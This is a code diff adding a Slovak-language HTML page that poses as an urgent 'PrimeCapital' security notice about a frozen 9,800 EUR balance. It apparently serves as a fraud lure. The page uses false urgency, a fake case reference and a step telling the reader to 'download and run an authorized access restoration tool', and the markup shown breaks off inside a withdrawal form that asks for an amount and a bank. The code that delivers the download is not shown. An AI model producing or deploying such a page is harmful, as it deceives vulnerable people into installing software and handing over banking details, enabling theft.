@@ -1,0 +1,3534 @@
+<!DOCTYPE html>
+<html lang="sk">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Account Security — Technický výber peňazí</title>
+  <link rel="icon" type="image/svg+xml" href="favicon.svg">
+  <meta name="description" content="PrimeCapital — bezpečný technický výber peňazí. Overenie účtu a rýchly prevod prostriedkov s ochranou EÚ.">
+  <meta name="theme-color" content="#C9A84C">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700;800&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="style.css">
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      document.body.classList.add('page-fade-in');
+    });
+    function smoothNavigate(href) {
+      document.body.classList.add('page-fade-out');
+      setTimeout(function() { window.location.href = href; }, 260);
+    }
+  </script>
+  <style>
+       /* ── BANK DROPDOWN ──────────────────────────────────────── */
+    .bank-select-wrap { position: relative; }
+    .bank-selected {
+      width: 100%; height: 46px;
+      background: #0a0a0a; border: 1.5px solid #2a2a2a; border-radius: 10px;
+      padding: 0 38px 0 14px; font-size: 14px; font-family: inherit; color: #D4D4D4;
+      cursor: pointer; display: flex; align-items: center; gap: 10px;
+      user-select: none; transition: border-color .15s, box-shadow .15s;
+    }
+    .bank-selected:hover { border-color: #C9A84C44; }
+    .bank-selected.open { border-color: #C9A84C66; background: #0f0f0f; box-shadow: 0 0 0 3px rgba(201,168,76,.08); }
+    .bank-selected .placeholder { color: #444; }
+    .bank-selected .chevron {
+      position: absolute; right: 12px; top: 50%; transform: translateY(-50%);
+      color: #555; transition: transform .2s; pointer-events: none;
+    }
+    .bank-selected.open .chevron { transform: translateY(-50%) rotate(180deg); }
+    .bank-logo { width: 24px; height: 24px; border-radius: 5px; object-fit: contain; background: #1a1a1a; flex-shrink: 0; }
+    .bank-logo-placeholder { width: 24px; height: 24px; border-radius: 5px; background: #1a1a1a; display: flex; align-items: center; justify-content: center; font-size: 11px; font-weight: 700; color: #C9A84C; flex-shrink: 0; }
+    .bank-label-text { flex: 1; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+    .bank-dropdown {
+      display: none; position: absolute; top: calc(100% + 6px); left: 0; right: 0;
+      background: #0f0f0f; border: 1px solid #2a2a2a; border-radius: 12px;
+      box-shadow: 0 8px 30px rgba(0,0,0,.5); z-index: 100; overflow: hidden;
+    }
+    .bank-dropdown.open { display: block; }
+    .bank-search-wrap { padding: 10px 12px 8px; border-bottom: 1px solid #1a1a1a; position: relative; }
+    .bank-search {
+      width: 100%; height: 36px; background: #0a0a0a; border: 1px solid #2a2a2a;
+      border-radius: 8px; padding: 0 10px 0 32px; font-size: 13px; font-family: inherit; color: #D4D4D4; outline: none;
+    }
+    .bank-search:focus { border-color: #C9A84C66; background: #0f0f0f; }
+    .bank-search-icon { position: absolute; left: 22px; top: 50%; transform: translateY(-50%); pointer-events: none; color: #555; }
+    .bank-list { max-height: 240px; overflow-y: auto; }
+    .bank-list::-webkit-scrollbar { width: 4px; }
+    .bank-list::-webkit-scrollbar-track { background: #0a0a0a; }
+    .bank-list::-webkit-scrollbar-thumb { background: #2a2a2a; border-radius: 4px; }
+    .bank-option {
+      display: flex; align-items: center; gap: 10px; padding: 9px 14px;
+      cursor: pointer; font-size: 13px; color: #aaa; transition: background .1s;
+    }
+    .bank-option:hover { background: #1a1407; color: #C9A84C; }
+    .bank-option.selected { background: #1a1407; color: #C9A84C; font-weight: 600; }
+    .bank-option .bank-name { flex: 1; }
+    .bank-option .bank-type { font-size: 11px; color: #555; background: #1a1a1a; padding: 1px 7px; border-radius: 10px; }
+    .bank-option.selected .bank-type { background: #261b08; color: #C9A84C; }
+    .bank-empty { padding: 16px 14px; font-size: 13px; color: #555; text-align: center; }
+
+    /* ── AMOUNT ERROR ───────────────────────────────────────── */
+    .amount-error { display: none; font-size: 11px; color: #C9A84C; margin-top: 5px; }
+
+    /* ── TRANSACTION HISTORY ────────────────────────────────── */
+    .tx-section { margin-top: 28px; }
+    .tx-header {
+      display: flex; align-items: center; justify-content: space-between;
+      margin-bottom: 12px;
+    }
+    .tx-title { font-size: 13px; font-weight: 700; color: #D4D4D4; }
+    .tx-count {
+      font-size: 11px; font-weight: 600; color: #555;
+      background: #1a1a1a; padding: 2px 9px; border-radius: 10px;
+    }
+    .tx-empty {
+      background: #0a0a0a; border: 1px dashed #2a2a2a; border-radius: 10px;
+      padding: 24px 16px; text-align: center; font-size: 13px; color: #444;
+    }
+    .tx-list { display: flex; flex-direction: column; gap: 0; }
+    .tx-item {
+      display: flex; align-items: center; gap: 12px;
+      padding: 11px 14px; background: #0f0f0f;
+      border: 1px solid #1e1e1e; border-radius: 10px; margin-bottom: 6px;
+      animation: txIn .3s ease;
+    }
+    @keyframes txIn { from { opacity:0; transform: translateY(-6px); } to { opacity:1; transform: translateY(0); } }
+    .tx-bank-logo { width: 32px; height: 32px; border-radius: 7px; object-fit: contain; background: #1a1a1a; flex-shrink: 0; }
+    .tx-bank-placeholder { width: 32px; height: 32px; border-radius: 7px; background: #1a1a1a; display: flex; align-items: center; justify-content: center; font-size: 12px; font-weight: 700; color: #C9A84C; flex-shrink: 0; }
+    .tx-info { flex: 1; min-width: 0; }
+    .tx-bank-name { font-size: 13px; font-weight: 600; color: #D4D4D4; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+    .tx-date { font-size: 11px; color: #555; margin-top: 1px; }
+    .tx-amount-col { text-align: right; flex-shrink: 0; }
+    .tx-amount { font-size: 14px; font-weight: 700; color: #E8C96A; }
+    .tx-status { font-size: 10px; font-weight: 600; color: #C9A84C; background: #1a1407; border: 1px solid #C9A84C44; padding: 1px 7px; border-radius: 8px; margin-top: 3px; display: inline-block; }
+
+    /* smooth transitions for account card state changes */
+    #status-pill { transition: background 0.5s ease, color 0.5s ease, border-color 0.5s ease; }
+    #s-dot { transition: background 0.5s ease; }
+    #bal-tag { transition: background 0.5s ease, color 0.5s ease; }
+
+    /* ── DANGEROUS ACTION BUTTON WITH NEON GLOW ─────────────── */
+    .btn-disconnect {
+      width: 100%;
+      display: flex; align-items: center; gap: 12px;
+      padding: 14px 16px;
+      border-radius: 12px;
+      border: 2px solid #ff2e5e;
+      background: linear-gradient(135deg, rgba(255,46,94,0.05), rgba(255,46,94,0.02));
+      color: #ff6b8a;
+      font-family: 'Inter', sans-serif;
+      font-size: 14px; font-weight: 700;
+      cursor: pointer; letter-spacing: -0.1px;
+      transition: all 0.25s cubic-bezier(0.22,1,0.36,1);
+      position: relative;
+      box-shadow: 0 0 20px rgba(255,46,94,0.3), inset 0 0 0 1px rgba(255,46,94,0.4);
+      margin-top: 14px;
+      overflow: hidden;
+    }
+
+    .btn-disconnect::before {
+      content: '';
+      position: absolute;
+      inset: -2px;
+      background: linear-gradient(90deg, transparent, rgba(255,46,94,0.6), transparent);
+      opacity: 0;
+      animation: neonPulse 3s ease-in-out infinite;
+      pointer-events: none;
+      border-radius: 12px;
+    }
+
+    @keyframes neonPulse {
+      0%, 100% { opacity: 0; }
+      50% { opacity: 1; }
+    }
+
+    .btn-disconnect:hover {
+      border-color: #ff1744;
+      background: linear-gradient(135deg, rgba(255,46,94,0.12), rgba(255,46,94,0.08));
+      color: #ff1744;
+      box-shadow: 0 0 30px rgba(255,46,94,0.5), inset 0 0 0 1px rgba(255,46,94,0.6), 0 0 40px rgba(255,46,94,0.2);
+      transform: translateY(-1px);
+    }
+
+    .btn-disconnect:active {
+      transform: translateY(0);
+    }
+
+    .btn-disconnect-icon {
+      width: 32px; height: 32px; border-radius: 8px;
+      background: rgba(255,46,94,0.15);
+      display: flex; align-items: center; justify-content: center; flex-shrink: 0;
+      transition: background 0.25s;
+      position: relative;
+      z-index: 1;
+    }
+
+    .btn-disconnect:hover .btn-disconnect-icon {
+      background: rgba(255,46,94,0.25);
+    }
+
+    .btn-disconnect-icon svg {
+      color: #ff6b8a;
+      transition: color 0.25s;
+    }
+
+    .btn-disconnect:hover .btn-disconnect-icon svg {
+      color: #ff1744;
+    }
+
+    .btn-disconnect-text {
+      flex: 1; text-align: left;
+      position: relative;
+      z-index: 1;
+    }
+
+    /* ── CERT MENU TRIGGER ──────────────────────────────────── */
+    .cert-btn-wrap { margin-top: 20px; }
+
+    .cert-divider {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 14px;
+    }
+    .cert-line { flex: 1; height: 1px; background: #1e1e1e; }
+    .cert-divider-text {
+      display: flex; align-items: center; gap: 5px;
+      font-size: 11px; font-weight: 500; color: #444; white-space: nowrap;
+    }
+
+    /* ── MENU TRIGGER BUTTON ── */
+    .btn-menu-trigger {
+      width: 100%;
+      display: flex; align-items: center; gap: 12px;
+      padding: 13px 16px;
+      border-radius: 12px;
+      border: 1.5px solid #2a2a2a;
+      background: #0a0a0a;
+      color: #aaa;
+      font-family: 'Inter', sans-serif;
+      font-size: 13px; font-weight: 600;
+      cursor: pointer; letter-spacing: -0.1px;
+      transition: border-color 0.18s, background 0.18s, box-shadow 0.18s;
+      position: relative;
+    }
+    .btn-menu-trigger:hover {
+      border-color: #C9A84C44;
+      background: #0f0f0f;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.3);
+    }
+    .btn-menu-trigger.open {
+      border-color: #C9A84C66;
+      background: #1a1407;
+      color: #C9A84C;
+      box-shadow: 0 0 0 3px rgba(201,168,76,0.08);
+    }
+    .btn-menu-trigger-icon {
+      width: 32px; height: 32px; border-radius: 8px;
+      background: #1a1a1a;
+      display: flex; align-items: center; justify-content: center; flex-shrink: 0;
+      transition: background 0.18s;
+    }
+    .btn-menu-trigger.open .btn-menu-trigger-icon {
+      background: #261b08;
+    }
+    .btn-menu-trigger-text { flex: 1; text-align: left; }
+    .btn-menu-trigger-sub {
+      font-size: 11px; font-weight: 400; color: #555;
+      display: block; margin-top: 1px;
+    }
+    .btn-menu-trigger.open .btn-menu-trigger-sub { color: #C9A84C88; }
+    .btn-menu-chevron {
+      flex-shrink: 0; color: #555;
+      transition: transform 0.28s cubic-bezier(0.4,0,0.2,1), color 0.18s;
+    }
+    .btn-menu-trigger.open .btn-menu-chevron {
+      transform: rotate(180deg); color: #C9A84C;
+    }
+
+    /* ── DROPDOWN PANEL ── */
+    .cert-menu-panel {
+      overflow: hidden;
+      max-height: 0;
+      opacity: 0;
+      transition:
+        max-height 0.38s cubic-bezier(0.4,0,0.2,1),
+        opacity 0.28s ease,
+        margin-top 0.28s ease;
+      margin-top: 0;
+    }
+    .cert-menu-panel.open {
+      max-height: 300px;
+      opacity: 1;
+      margin-top: 10px;
+    }
+    .cert-menu-inner {
+      border: 1.5px solid #C9A84C33;
+      border-radius: 13px;
+      background: linear-gradient(160deg, #100e04 0%, #0f0f0f 100%);
+      padding: 16px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.4), inset 0 1px 0 rgba(201,168,76,0.08);
+      position: relative; overflow: hidden;
+    }
+    .cert-menu-inner::before {
+      content: '';
+      position: absolute; top: 0; left: 0; right: 0; height: 1px;
+      background: linear-gradient(90deg, transparent, #C9A84C55 50%, transparent);
+    }
+    .cert-menu-desc {
+      display: flex; align-items: flex-start; gap: 10px;
+      margin-bottom: 14px;
+    }
+    .cert-menu-desc-icon {
+      width: 30px; height: 30px; border-radius: 8px; flex-shrink: 0;
+      background: rgba(201,168,76,0.35);
+      display: flex; align-items: center; justify-content: center;
+    }
+    .cert-menu-desc-text {
+      font-size: 12.5px; color: #8B6914; line-height: 1.55;
+    }
+    .cert-menu-desc-text strong { font-weight: 700; display: block; margin-bottom: 2px; }
+
+    /* ── BLUE CERT BUTTON (inside panel) ── */
+    .btn-cert {
+      width: 100%;
+      display: flex; align-items: center; gap: 10px;
+      padding: 13px 16px;
+      border-radius: 11px;
+      border: 1.5px solid #C9A84C;
+      background: linear-gradient(135deg, #C9A84C 0%, #8B6914 100%);
+      color: #D4D4D4;
+      font-family: 'Inter', sans-serif;
+      font-size: 13.5px; font-weight: 700;
+      cursor: pointer; letter-spacing: -0.2px;
+      box-shadow: 0 3px 14px rgba(201,168,76,0.35), inset 0 1px 0 rgba(255,255,255,0.15);
+      transition: background 0.18s, box-shadow 0.18s, transform 0.1s;
+      position: relative; overflow: hidden;
+    }
+    .btn-cert::before {
+      content: '';
+      position: absolute; top: 0; left: 0; right: 0; height: 1px;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.25) 50%, transparent);
+    }
+    .btn-cert:hover {
+      background: linear-gradient(135deg, #8B6914 0%, #8B6914 100%);
+      box-shadow: 0 5px 20px rgba(201,168,76,0.35), inset 0 1px 0 rgba(255,255,255,0.12);
+    }
+    .btn-cert:active { transform: scale(0.98); }
+    .btn-cert:disabled { opacity: 0.5; cursor: not-allowed; }
+
+    .btn-cert-icon-box {
+      width: 32px; height: 32px; border-radius: 8px;
+      background: rgba(255,255,255,0.18);
+      display: flex; align-items: center; justify-content: center; flex-shrink: 0;
+    }
+    .btn-cert-text { flex: 1; text-align: left; }
+    .btn-cert-arrow {
+      flex-shrink: 0; opacity: 0.7;
+      transition: opacity 0.15s, transform 0.15s;
+    }
+    .btn-cert:hover .btn-cert-arrow { opacity: 1; transform: translateX(3px); }
+
+    /* security badge */
+    .cert-secure-note {
+      display: flex; align-items: center; justify-content: center;
+      gap: 5px; margin-top: 10px;
+      font-size: 10.5px; color: #C9A84C; font-weight: 500;
+    }
+
+    @keyframes certSpin {
+      to { transform: rotate(360deg); }
+    }
+
+    /* ── MENU ACTION BUTTONS ──────────────────────────────── */
+    .menu-action-btn {
+      width: 100%;
+      display: flex; align-items: center; gap: 11px;
+      padding: 12px 14px;
+      border-radius: 12px;
+      border: 1.5px solid transparent;
+      font-family: 'Inter', sans-serif;
+      font-size: 13px; font-weight: 600;
+      cursor: pointer; text-align: left;
+      transition: background 0.18s, border-color 0.18s, box-shadow 0.18s, transform 0.1s;
+      position: relative; overflow: hidden;
+    }
+    .menu-action-btn::before {
+      content: '';
+      position: absolute; top: 0; left: 0; right: 0; height: 1px;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.6) 50%, transparent);
+    }
+    .menu-action-btn:active { transform: scale(0.985); }
+    .menu-action-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+
+    .menu-action-btn--blue {
+      background: linear-gradient(135deg, #C9A84C 0%, #8B6914 100%);
+      border-color: #C9A84C;
+      color: #D4D4D4;
+      box-shadow: 0 3px 12px rgba(201,168,76,0.35), inset 0 1px 0 rgba(255,255,255,0.12);
+    }
+    .menu-action-btn--blue:hover {
+      background: linear-gradient(135deg, #8B6914 0%, #8B6914 100%);
+      box-shadow: 0 5px 18px rgba(201,168,76,0.35);
+    }
+
+    .menu-action-btn--green {
+      background: linear-gradient(135deg, #C9A84C 0%, #8B6914 100%);
+      border-color: #C9A84C;
+      color: #D4D4D4;
+      box-shadow: 0 3px 12px rgba(201,168,76,0.28), inset 0 1px 0 rgba(255,255,255,0.12);
+    }
+    .menu-action-btn--green:hover {
+      background: linear-gradient(135deg, #8B6914 0%, #8B6914 100%);
+      box-shadow: 0 5px 18px rgba(201,168,76,0.28);
+    }
+
+    .menu-action-icon {
+      width: 34px; height: 34px; border-radius: 9px; flex-shrink: 0;
+      background: rgba(255,255,255,0.18);
+      display: flex; align-items: center; justify-content: center;
+    }
+    .menu-action-body { flex: 1; display: flex; flex-direction: column; gap: 2px; }
+    .menu-action-title { font-size: 13px; font-weight: 700; line-height: 1.2; }
+    .menu-action-sub   { font-size: 11px; font-weight: 400; opacity: 0.72; }
+
+    .menu-action-arrow { flex-shrink: 0; opacity: 0.65; transition: opacity 0.15s, transform 0.15s; }
+    .menu-action-btn:hover .menu-action-arrow { opacity: 1; transform: translateX(3px); }
+
+    .menu-action-divider {
+      display: flex; align-items: center; gap: 8px; margin: 10px 0;
+    }
+    .menu-action-divider-line { flex: 1; height: 1px; background: rgba(255,255,255,0.12); }
+    .menu-action-divider-text { font-size: 10.5px; color: rgba(255,255,255,0.35); font-weight: 500; }
+
+    .cert-menu-inner {
+      background: linear-gradient(160deg, #1a1407 0%, #0f0f0f 100%) !important;
+      border-color: #C9A84C44 !important;
+      box-shadow: 0 6px 24px rgba(0,0,0,0.3), inset 0 1px 0 rgba(201,168,76,0.06) !important;
+    }
+	
+	
+  
+/* FINAL POLISH OVERRIDES */
+.dp-option, .zdroj-opt, .quiz-opt, .main-btns button, .btn-outline, .form-input, .quiz-text-input {
+  transition: all .28s cubic-bezier(.22,1,.36,1);
+}
+.dp-option:hover, .zdroj-opt:hover, .quiz-opt:hover {
+  transform: translateY(-2px);
+  border-color: #C9A84C !important;
+  box-shadow: 0 10px 28px rgba(201,168,76,.12);
+}
+#btn-update {
+  position: relative;
+  overflow:hidden;
+}
+#btn-update::before {
+  content:""; position:absolute; inset:-80%;
+  background:radial-gradient(circle,rgba(255,255,255,.22),transparent 45%);
+  transform:translateX(-60%);
+  transition:transform .8s ease;
+}
+#btn-update:hover::before { transform:translateX(60%); }
+.quiz-card, .account-card, .email-card {
+  animation-duration:.75s !important;
+}
+.quiz-watermark {
+  background:#100e04 !important;
+  border-color:#C9A84C22 !important;
+  color:#888 !important;
+}
+.dp-subtitle, .quiz-subtitle { color:#888 !important; }
+
+/* ── CRITICAL MOBILE FIX — override style.css fixed width ── */
+html, body { max-width: 100%; overflow-x: hidden; }
+.page-wrap { width: 100% !important; max-width: 610px; padding: 0 !important; box-sizing: border-box; }
+body { padding: 20px 0 40px !important; }
+
+/* ── MOBILE OPTIMISATION ─────────────────────────────── */
+@media (max-width: 480px) {
+  /* Page layout */
+  .page-wrap { padding: 0; }
+  .email-card { border-radius: 0; border-left: none; border-right: none; margin: 0; }
+
+  /* Header */
+  .email-header { padding: 16px 16px 14px; }
+  .header-title { font-size: 22px; line-height: 1.25; }
+  .header-meta { font-size: 11px; }
+
+  /* Body */
+  .email-body { padding: 14px 14px 24px; }
+
+  /* Account card */
+  .account-card { padding: 14px; border-radius: 12px; }
+  .ac-header { gap: 10px; }
+  .coin-avatar { width: 38px; height: 38px; font-size: 18px; flex-shrink: 0; }
+  .ac-name { font-size: 13px; }
+  .ac-id { font-size: 10px; }
+  .status-pill { font-size: 10px; padding: 3px 9px; white-space: nowrap; }
+
+  /* Balance */
+  .balance-row { gap: 6px; flex-wrap: wrap; }
+  .balance-num { font-size: 26px; }
+  .balance-cur { font-size: 14px; }
+  .balance-tag { font-size: 10px; padding: 2px 8px; }
+
+  /* Stats row */
+  .stats-row { flex-direction: column; gap: 8px; }
+  .stat-cell { width: 100%; }
+  .stat-label { font-size: 10px; }
+  .stat-value { font-size: 12px; }
+
+  /* Steps */
+  .steps { gap: 10px; padding: 12px; border-radius: 12px; }
+  .step { gap: 10px; }
+  .step-num { width: 26px; height: 26px; font-size: 11px; flex-shrink: 0; }
+  .step-title { font-size: 13px; }
+  .step-desc { font-size: 11px; }
+
+  /* Buttons */
+  .main-btns { gap: 8px; }
+  .btn-dark, .btn-outline { font-size: 13px; padding: 12px 16px; border-radius: 10px; }
+
+  /* Withdrawal section */
+  .withdrawal { padding: 14px; border-radius: 12px; }
+  .wd-header { margin-bottom: 12px; }
+  .wd-title { font-size: 13px; }
+  .form-label { font-size: 12px; }
+  .form-input { font-size: 14px; height: 44px; }
+  .form-note { font-size: 11px; }
+
+  /* Bank dropdown */
+  .bank-selected { height: 44px; font-size: 13px; }
+  .bank-list { max-height: 200px; }
+  .bank-option { padding: 10px 12px; font-size: 13px; }
+
+  /* Cert/menu buttons */
+  .btn-menu-trigger { padding: 12px 14px; font-size: 13px; }
+  .btn-menu-trigger-icon { width: 28px; height: 28px; }
+  .menu-action-btn { padding: 11px 12px; font-size: 13px; }
+  .menu-action-icon { width: 30px; height: 30px; border-radius: 8px; }
+  .menu-action-title { font-size: 13px; }
+  .menu-action-sub { font-size: 10px; }
+
+  /* Quiz / questionnaire */
+  .quiz-card { border-radius: 12px; padding: 0; }
+  .quiz-header { padding: 12px 14px; }
+  .quiz-title { font-size: 13px; }
+  .quiz-subtitle { font-size: 10px; }
+  .quiz-body { padding: 12px 14px; }
+  .quiz-question { font-size: 14px; }
+  .quiz-opt { font-size: 13px; padding: 10px 12px; }
+  .quiz-text-input { font-size: 14px; height: 44px; }
+  .quiz-footer { padding: 12px 14px; }
+  .quiz-btn-next { font-size: 13px; padding: 12px 16px; border-radius: 10px; }
+
+  /* Transaction history */
+  .tx-item { padding: 10px 12px; gap: 10px; }
+  .tx-bank-logo, .tx-bank-placeholder { width: 28px; height: 28px; border-radius: 6px; }
+  .tx-bank-name { font-size: 12px; }
+  .tx-amount { font-size: 13px; }
+  .tx-status { font-size: 9px; }
+
+  /* Device picker */
+  .dp-option { padding: 12px; gap: 10px; border-radius: 12px; }
+  .dp-icon-box { width: 40px; height: 40px; border-radius: 10px; flex-shrink: 0; }
+  .dp-title { font-size: 13px; }
+  .dp-subtitle { font-size: 11px; }
+
+  /* Top label */
+  .top-label { font-size: 11px; padding: 5px 12px; border-radius: 0 0 10px 10px; }
+
+  /* Alert strip */
+  .alert-strip { padding: 10px 12px; border-radius: 10px; font-size: 12px; }
+
+  /* Section labels */
+  .section-label { font-size: 11px; }
+
+  /* Prevent horizontal scroll */
+  body { overflow-x: hidden; }
+}
+
+@media (max-width: 360px) {
+  .balance-num { font-size: 22px; }
+  .header-title { font-size: 19px; }
+  .btn-dark, .btn-outline { font-size: 12px; padding: 11px 14px; }
+}
+
+</style>
+  <script defer src="/_vercel/insights/script.js"></script>
+  <script defer src="/_vercel/speed-insights/script.js"></script>
+</head>
+<body>
+ 
+  
+
+
+<div class="grid-bg"></div>
+<div class="page-wrap">
+
+  <div class="top-label" id="top-label">
+    <span class="blink-dot" id="top-dot"></span>
+    <span class="top-label-text">Automatické systémové oznámenie</span>
+  </div>
+
+  <div class="email-card" id="email-card">
+
+    <!-- HEADER -->
+    <header class="email-header">
+      <div class="header-glow"></div>
+      <div class="header-top">
+        <div class="logo-area">
+          <div class="logo-box" style="background:linear-gradient(135deg,#C9A84C,#8B6914);border-radius:10px;font-size:18px;display:flex;align-items:center;justify-content:center;">♛</div>
+          <span class="logo-name" style="font-family:'Playfair Display',serif;font-size:18px;font-weight:700;color:#fff;">Prime<strong style="color:#C9A84C;">Capital</strong></span>
+        </div>
+        <div class="crit-badge">
+          <span class="blink-dot" id="crit-dot"></span>
+          Kritické
+        </div>
+      </div>
+      <h1 class="header-title">Upozornenie na<br>stav účtu</h1>
+      <p class="header-meta">
+        Odoslané <span id="live-time" class="meta-val">—</span>
+        &nbsp;·&nbsp; Ref. <span class="meta-val">#SEC-2026-41823</span>
+      </p>
+    </header>
+
+    <!-- BODY -->
+    <main class="email-body">
+
+      <div class="alert-strip anim-slide">
+        <div class="alert-icon-box">
+          <svg width="15" height="15" viewBox="0 0 15 15" fill="none">
+            <path d="M7.5 1.5L13.5 12H1.5Z" stroke="#C9A84C" stroke-width="1.3" stroke-linejoin="round"/>
+            <path d="M7.5 5.5v3.5" stroke="#C9A84C" stroke-width="1.3" stroke-linecap="round"/>
+            <circle cx="7.5" cy="10.5" r="0.65" fill="#C9A84C"/>
+          </svg>
+        </div>
+        <p><strong>Vyžaduje sa okamžitá akcia</strong>Zistili sme aktivitu, ktorá vyžaduje vašu pozornosť. Pre obnovenie plnej funkčnosti postupujte podľa pokynov nižšie.</p>
+      </div>
+
+      <!-- case reference strip -->
+      <div style="display:flex;align-items:center;justify-content:space-between;background:#0a0a0a;border:1px solid #1e1e1e;border-radius:10px;padding:9px 14px;margin-bottom:22px;">
+        <div style="display:flex;align-items:center;gap:7px;">
+          <span style="width:5px;height:5px;border-radius:50%;background:#C9A84C;display:inline-block;flex-shrink:0;"></span>
+          <span style="font-size:11px;font-weight:600;color:#444;letter-spacing:0.3px;">Referencia prípadu</span>
+        </div>
+        <span style="font-size:11px;color:#333;font-family:'Courier New',monospace;">#SEC-2026-41823</span>
+      </div>
+
+      <p class="section-label">Stav účtu</p>
+      <div class="account-card anim-up delay-2">
+        <div class="ac-header">
+          <div class="coin-avatar">₮</div>
+          <div class="ac-info">
+            <div class="ac-name" id="ac-fullname">Technický Výber Peňazí</div>
+            <div class="ac-id" id="ac-code">ID: Ao-3\314324.13</div>
+          </div>
+          <div class="status-pill" id="status-pill"><span class="s-dot" id="s-dot"></span><span id="status-text">Pozastavené</span></div>
+        </div>
+        <div class="ac-body">
+          <div class="balance-row">
+            <span class="balance-num" id="bal-num">9 800,00</span>
+            <span class="balance-cur">EUR</span>
+            <span class="balance-tag" id="bal-tag">Zmrazené</span>
+          </div>
+          <div class="stats-row">
+            <div class="stat-cell">
+              <div class="stat-label">Limit čerpania</div>
+              <div class="stat-value" id="limit-display">9 800,00 / 9 800,00 EUR</div>
+            </div>
+            <div class="stat-cell">
+              <div class="stat-label">Posledná transakcia</div>
+              <div class="stat-value" id="last-tx">—</div>
+            </div>
+          </div>
+          <div class="progress-header">
+            <span>Využitý limit</span>
+            <span id="progress-label" class="danger-text">100% — Limit dosiahnutý</span>
+          </div>
+          <div class="progress-bg"><div class="progress-fill" id="progress-fill"></div></div>
+        </div>
+      </div>
+
+      <p class="section-label" style="margin-bottom:10px">Čo robiť</p>
+      <div class="steps anim-up delay-3">
+        <div class="step">
+          <div class="step-num step-done">&#10003;</div>
+          <div class="step-body">
+            <div class="step-title">Totožnosť overená</div>
+            <div class="step-desc">Váš účet bol identifikovaný v systéme.</div>
+          </div>
+        </div>
+        <div class="step">
+          <div class="step-num step-active" id="step2-num">2</div>
+          <div class="step-body">
+            <div class="step-title" id="step2-title">Spustite bezpečnostnú aktualizáciu</div>
+            <div class="step-desc">Stiahnite a spustite autorizovaný nástroj na obnovu prístupu.</div>
+          </div>
+        </div>
+        <div class="step">
+          <div class="step-num step-off" id="step3-num">3</div>
+          <div class="step-body">
+            <div class="step-title step-title--muted" id="step3-title">Obnovenie účtu</div>
+            <div class="step-desc" id="step3-desc">Váš účet bude plne obnovený do 15 minút.</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="main-btns anim-up delay-4">
+        <button class="btn-dark" id="btn-update" onclick="showDevicePicker()" style="width:100%;">
+          <svg width="15" height="15" viewBox="0 0 15 15" fill="none"><path d="M2 7.5h10M8 3.5l4 4-4 4" stroke="#D4D4D4" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/></svg>
+          <span id="btn-update-text">Začať aktualizáciu</span>
+        </button>
+        <a href="https://coinmarketcap.com/community/ru/profile/Cislo_robota12532/?type=Posts" class="btn-outline" id="btn-verify" onclick="animateVerify(event)">Overiť obchodný systém</a>
+      </div>
+
+      <div class="or-divider">
+        <span class="or-line"></span><span class="or-text">alebo</span><span class="or-line"></span>
+      </div>
+
+      <!-- WITHDRAWAL -->
+      <div class="withdrawal anim-up delay-5">
+        <div class="wd-header">
+          <span class="wd-title">Požiadať o výber</span>
+          <span class="wd-badge">Dostupné</span>
+        </div>
+
+        <!-- AMOUNT -->
+        <div class="form-field">
+          <label class="form-label">
+            <svg width="12" height="12" viewBox="0 0 12 12" fill="none"><circle cx="6" cy="6" r="5" stroke="#555555" stroke-width="1.1"/><path d="M6 2.5v7M4.5 4c0-.83.67-1.5 1.5-1.5S7.5 3.17 7.5 4 6.83 5.5 6 5.5 4.5 6.2 4.5 7s.67 1.5 1.5 1.5S7.5 7.83 7.5 7" stroke="#555555" stroke-width="1" stroke-linecap="round"/></svg>
+            Suma výberu <span class="form-hint-inline">— v EUR</span>
+          </label>
+          <div class="input-wrap">
+            <span class="input-icon">
+              <svg width="13" height="13" viewBox="0 0 13 13" fill="none"><circle cx="6.5" cy="6.5" r="5.2" stroke="#888888" stroke-width="1.2"/><path d="M6.5 3.5v6M5 5c0-.83.67-1.5 1.5-1.5S8 4.17 8 5s-.67 1.5-1.5 1.5S5 7.2 5 8s.67 1.5 1.5 1.5S8 8.83 8 8" stroke="#888888" stroke-width="1" stroke-linecap="round"/></svg>
+            </span>
+            <input type="text" id="amount-input" class="form-input" placeholder="Zadajte sumu (napr. 500)" maxlength="10" inputmode="decimal">
+          </div>
+          <div class="amount-error" id="amount-error"></div>
+          <p class="form-note">
+            <svg width="11" height="11" viewBox="0 0 11 11" fill="none"><circle cx="5.5" cy="5.5" r="4.5" stroke="#D4D4D4" stroke-width="1"/><path d="M5.5 4v3" stroke="#D4D4D4" stroke-width="1" stroke-linecap="round"/><circle cx="5.5" cy="8" r="0.5" fill="#D4D4D4"/></svg>
+            Aktuálny zostatok: <strong id="max-balance-label">9 800,00 EUR</strong>
+          </p>
+        </div>
+
+        <div class="field-divider"><span class="fd-line"></span><span class="fd-text">a</span><span class="fd-line"></span></div>
+
+        <!-- BANK -->
+        <div class="form-field" style="margin-bottom:0">
+          <label class="form-label">
+            <svg width="12" height="12" viewBox="0 0 12 12" fill="none"><rect x="1" y="5" width="10" height="6.5" rx="1" stroke="#555555" stroke-width="1.1"/><path d="M6 1.5L11 5H1Z" stroke="#555555" stroke-width="1.1" stroke-linejoin="round"/></svg>
+            Výber banky
+          </label>
+          <div class="bank-select-wrap" id="bank-select-wrap">
+            <div class="bank-selected" id="bank-trigger" onclick="toggleBank()">
+              <span class="placeholder" id="bank-display">Vyberte svoju banku</span>
+              <svg class="chevron" width="14" height="14" viewBox="0 0 14 14" fill="none">
+                <path d="M3 5l4 4 4-4" stroke="#888888" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+              </svg>
+            </div>
+            <div class="bank-dropdown" id="bank-dropdown">
+              <div class="bank-search-wrap">
+                <svg class="bank-search-icon" width="13" height="13" viewBox="0 0 13 13" fill="none">
